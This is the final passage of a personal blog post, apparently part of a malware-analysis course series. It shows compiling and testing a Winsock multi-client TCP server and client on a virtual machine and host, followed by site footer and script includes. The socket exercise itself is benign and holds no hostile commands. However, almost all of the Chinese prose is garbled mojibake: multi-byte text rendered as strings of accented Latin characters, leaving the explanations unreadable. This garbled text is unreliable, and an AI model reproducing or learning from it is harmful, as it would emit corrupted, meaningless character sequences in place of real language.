<li>IP åœ°å€ç¡¬ç¼–ç ä¸º â€œ192.168.65.136â€ï¼Œåœ¨å®é™…åº”ç”¨ä¸­å¯èƒ½éœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œæ›´çµæ´»çš„é…ç½®ã€‚</li>
<li>è¾“å…¥ â€˜exitâ€™ ä¼šé€€å‡ºå¾ªç¯ï¼Œå…³é—­å¥—æ¥å­—ï¼Œå¹¶æ¸…ç† Winsock</li>
</ul>
<h5 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h5><ol>
<li><strong>è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ç¼–è¯‘cppã€‚</strong></li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ task3_server.cpp -o task3_server.exe -lws2_32</span><br><span class="line">g++ task3_client.cpp -o task3_client.exe -lws2_32</span><br></pre></td></tr></table></figure>

<p><code>-lws2_32</code> é€‰é¡¹çš„ä½œç”¨æ˜¯åœ¨é“¾æ¥é˜¶æ®µå°† Winsock åº“ä¸ä½ çš„ç¨‹åºå…³è”ï¼Œä½¿å¾—ä½ å¯ä»¥åœ¨ç¨‹åºä¸­ä½¿ç”¨ Winsock æä¾›çš„ç½‘ç»œå‡½æ•°ã€‚å¦‚æœä½ åœ¨ç¨‹åºä¸­ä½¿ç”¨äº† Winsock å‡½æ•°ï¼Œä½†æ²¡æœ‰æ·»åŠ è¿™ä¸ªé€‰é¡¹ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼Œå› ä¸ºå®ƒæ‰¾ä¸åˆ°ç›¸åº”çš„å‡½æ•°å®ç°ã€‚</p>
<ol start="2">
<li><strong>åœ¨è™šæ‹Ÿæœº(ip&#x3D;192.168.65.136)ä¸Šè¿è¡Œserverç¨‹åºï¼Œåœ¨ç‰©ç†æœºä¸Šè¿è¡Œclientç¨‹åºã€‚</strong></li>
</ol>
<p>åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œtask3_server.exe:</p>
<p><a href="/../img/Malware-Analysis-Practice2/6.png" title="6" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/6.png" alt="6"></a></p>
<p>åœ¨ç‰©ç†æœºä¸Šè¿è¡Œtask3_client.exe:</p>
<p><a href="/../img/Malware-Analysis-Practice2/7.png" title="7" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/7.png" alt="7"></a></p>
<p>å¯ä»¥çœ‹è§clientç«¯è¿æ¥ä¸Šserverç«¯æ—¶ï¼Œserverç«¯ä¼šæ‰“å°ç›®å‰è¿æ¥çš„clientæ•°é‡ä»¥åŠipå’Œportä¿¡æ¯ã€‚</p>
<ol start="3">
<li><strong>å°è¯•å¤šä¸ªclientç«¯è¿æ¥serverç«¯</strong></li>
</ol>
<p>åœ¨ç‰©ç†æœºä¸Šè¿è¡Œ3ä¸ªtask3_client.exeç¨‹åºï¼Œæ¨¡æ‹Ÿä¸‰ä¸ªclientè¿æ¥è‡³serverã€‚</p>
<p><a href="/../img/Malware-Analysis-Practice2/8.png" title="8" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/8.png" alt="8"></a></p>
<p>å¯ä»¥åœ¨serverç«¯çœ‹è§ä¸‰ä¸ªclientçš„ipå’Œportä¿¡æ¯ã€‚</p>
<ol start="4">
<li><strong>clientç«¯å‘serverç«¯å‘é€æ•°æ®</strong></li>
</ol>
<p><a href="/../img/Malware-Analysis-Practice2/9.png" title="9" class="gallery-item" style="box-shadow: none;"> <img src="/../img/Malware-Analysis-Practice2/9.png" alt="9"></a></p>
<p>å¯ä»¥çœ‹è§åœ¨serverç«¯å¯ä»¥æ­£å¸¸æ”¶åˆ°å¤šä¸ªclientçš„æ¶ˆæ¯ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ­£ç¡®å¤„ç†ã€‚</p>
</div>
    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-11-26</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« jay1an</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/c/'>
                            c
                        </a>
                    
                        <a href='/tags/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/'>
                            ç³»ç»Ÿç¼–ç¨‹
                        </a>
                    
                        <a href='/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/'>
                            æ¶æ„ä»£ç åˆ†æ
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/'>
                            ç½‘ç»œç©ºé—´å®‰å…¨
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    <br>
    
    
        
            
    
            <div class="post-footer-pre-next">
                
                    <span>ä¸Šä¸€ç¯‡ï¼š<a href='/2023/11/30/DNS-Attack-Lab/'>DNS Attack Lab</a></span>
                

                
                    <span class="post-footer-pre-next-last-span-right">ä¸‹ä¸€ç¯‡ï¼š<a href="/2023/11/22/TCP-IP-Attack-Lab/">TCP/IP-Attack-Lab</a>
                    </span>
                
            </div>
    
        
    

    
        

     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 Jay1an 

            
                

            
        </span>
       
    
</div>



<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ä»å¤´åŠªåŠ›ä¹Ÿåå·</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    

    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="/js/returnToTop.js"></script>

    

    
        
<script src="/js/returnToLastPage.js"></script>

    





<script src="/js/lightgallery/lightgallery.umd.min.js"></script>



<script src="/js/lightgallery/plugins/lg-thumbnail.umd.min.js"></script>



<script src="/js/lightgallery/plugins/lg-fullscreen.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-autoplay.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-zoom.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-rotate.umd.min.js"></script>


<script src="/js/lightgallery/plugins/lg-paper.umd.min.js"></script>




<script type="text/javascript">
     
    if (typeof lightGallery !== "undefined") {
        var options1 = {
            selector: '.gallery-item',
            plugins: [lgThumbnail, lgFullscreen, lgAutoplay, lgZoom, lgRotate, lgPager], // å¯ç”¨æ’ä»¶
            thumbnail: true,          // æ˜¾ç¤ºç¼©ç•¥å›¾
            zoom: true,               // å¯ç”¨ç¼©æ”¾åŠŸ
            rotate: true,             // å¯ç”¨æ—‹è½¬åŠŸèƒ½èƒ½
            autoplay: true,        // å¯ç”¨è‡ªåŠ¨æ’­æ”¾åŠŸèƒ½
            fullScreen: true,      // å¯ç”¨å…¨å±åŠŸèƒ½
            pager: false, //é¡µç ,
            zoomFromOrigin: true,   // ä»åŸå§‹ä½ç½®ç¼©æ”¾
            actualSize: true,       // å¯ç”¨æŸ¥çœ‹å®é™…å¤§å°çš„åŠŸèƒ½
            enableZoomAfter: 300,    // å»¶è¿Ÿç¼©æ”¾ï¼Œç¡®ä¿å›¾ç‰‡åŠ è½½å®Œæˆåå¯ç¼©æ”¾
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1); // ä¿®å¤é€‰æ‹©å™¨
    }
    
</script>


    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> 

                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
            
                <!-- è¿”å›çš„æŒ‰é’®-->  
                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>
</html>